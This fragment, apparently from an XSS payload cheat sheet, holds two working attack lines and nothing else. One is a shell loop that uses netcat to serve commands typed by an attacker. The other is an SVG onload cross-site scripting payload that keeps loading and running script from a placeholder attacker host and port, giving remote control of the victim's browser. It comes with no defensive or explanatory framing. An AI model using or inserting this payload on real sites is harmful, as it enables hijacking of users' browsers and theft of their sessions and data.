    // Send commands with
    // while :; do printf &#34;j$ &#34;; read c; echo $c | nc -lp PORT &gt;/dev/null; done
    &lt;svg/onload=setInterval(function(){d=document;z=d.createElement(&#34;script&#34;);z.src=&#34;//HOST:PORT&#34;;d.body.appendChild(z)},0)&gt;
    
